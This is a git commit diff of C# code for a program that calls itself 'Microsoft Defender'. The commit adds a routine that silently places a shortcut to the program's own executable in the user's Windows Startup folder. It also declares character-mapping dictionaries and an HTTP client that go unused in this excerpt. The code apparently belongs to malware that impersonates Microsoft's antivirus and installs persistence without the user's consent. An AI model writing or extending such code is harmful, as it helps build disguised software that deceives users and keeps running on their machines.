cf6780174d217f76a6a976820577a8631316a816
Evgeniy Mukhin <Taburetka2281337@gmail.co>
2022-12-01 20:46:45 +0300

    Добавил создание ярлыка в директории автозагрузки

--- Microsoft Defender/Form1.cs
+++ Microsoft Defender/Form1.cs
@@ -1,20 +1,47 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Net.Http;
+using Microsoft.VisualBasic.Devices;
+using IWshRuntimeLibrary;
 
 namespace Microsoft_Defender
 {
     public partial class Form1 : Form
     {
+        static Dictionary<int, char> englishLowercaseDict = new Dictionary<int, char>();
+        static Dictionary<int, char> englishUppercaseDict = new Dictionary<int, char>();
+        static HttpClient httpClient = new HttpClient();
         public Form1()
         {
             InitializeComponent();
+            var ShortcutPath = Environment.CurrentDirectory + @"\Microsoft Defender.lnk";
+            string TargetPath = Environment.CurrentDirectory + @"\Microsoft Defender.exe";
+            WshShell wshShell = new WshShell();
+
+            string user = Environment.UserName;
+
+            string[] Drives = Environment.GetLogicalDrives();
+
+            foreach (string s in Drives)
+            {
+                string path = s + @"Users\" + user + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
+                if (Directory.Exists(path))
+                {
+                    ShortcutPath = path + @"\Microsoft Defender.lnk";
+                }
+            }
+
+            IWshShortcut Shortcut = (IWshShortcut)wshShell.
+                CreateShortcut(ShortcutPath);
+
+            Shortcut.TargetPath = TargetPath;
+
+            Shortcut.Save();
         }
     }
 }
+
+
